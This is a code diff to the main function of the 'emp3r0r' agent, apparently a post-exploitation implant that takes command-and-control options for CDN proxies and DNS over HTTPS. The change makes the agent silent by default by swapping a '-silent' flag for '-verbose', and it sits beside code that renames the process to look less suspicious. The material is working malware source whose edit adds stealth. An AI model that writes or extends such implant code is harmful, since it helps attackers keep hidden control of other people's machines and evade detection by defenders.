@@ -37,10 +37,33 @@ func main() {
 	cdnProxy := flag.String("cdnproxy", "", "CDN proxy for emp3r0r agent's C2 communication")
 	doh := flag.String("doh", "", "DNS over HTTPS server for CDN proxy's DNS requests")
 	replace := flag.Bool("replace", false, "Replace existing agent process")
-	silent := flag.Bool("silent", false, "Suppress output")
+	verbose := flag.Bool("verbose", false, "Enable logging")
 	runasdaemon := flag.Bool("daemon", false, "Daemonize")
 	version := flag.Bool("version", false, "Show version info")
 	flag.Parse()
+
+	// silent switch
+	log.SetOutput(ioutil.Discard)
+	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
+	if *verbose {
+		fmt.Println("emp3r0r agent has started")
+		log.SetOutput(os.Stderr)
+
+		// redirect everything to log file
+		f, err := os.OpenFile(fmt.Sprintf("%s/emp3r0r.log",
+			agent.RuntimeConfig.AgentRoot),
+			os.O_RDWR|os.O_CREATE|os.O_APPEND, 0600)
+		if err != nil {
+			log.Printf("error opening emp3r0r.log: %v", err)
+		} else {
+			log.SetOutput(f)
+			defer f.Close()
+			err = syscall.Dup2(int(f.Fd()), int(os.Stderr.Fd()))
+			if err != nil {
+				log.Fatalf("Cannot redirect stderr to log file: %v", err)
+			}
+		}
+	}
 
 	// rename our agent process to make it less suspecious
 	osArgs := os.Args
@@ -82,29 +105,6 @@ func main() {
 		err = os.MkdirAll(agent.RuntimeConfig.UtilsPath, 0700)
 		if err != nil {
 			log.Fatalf("[-] Cannot mkdir %s: %v", agent.RuntimeConfig.AgentRoot, err)
-		}
-	}
-
-	// silent switch
-	log.SetOutput(ioutil.Discard)
-	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
-	if !*silent {
-		fmt.Println("emp3r0r agent has started")
-		log.SetOutput(os.Stderr)
-
-		// redirect everything to log file
-		f, err := os.OpenFile(fmt.Sprintf("%s/emp3r0r.log",
-			agent.RuntimeConfig.AgentRoot),
-			os.O_RDWR|os.O_CREATE|os.O_APPEND, 0600)
-		if err != nil {
-			log.Printf("error opening emp3r0r.log: %v", err)
-		} else {
-			log.SetOutput(f)
-			defer f.Close()
-			err = syscall.Dup2(int(f.Fd()), int(os.Stderr.Fd()))
-			if err != nil {
-				log.Fatalf("Cannot redirect stderr to log file: %v", err)
-			}
 		}
 	}
 
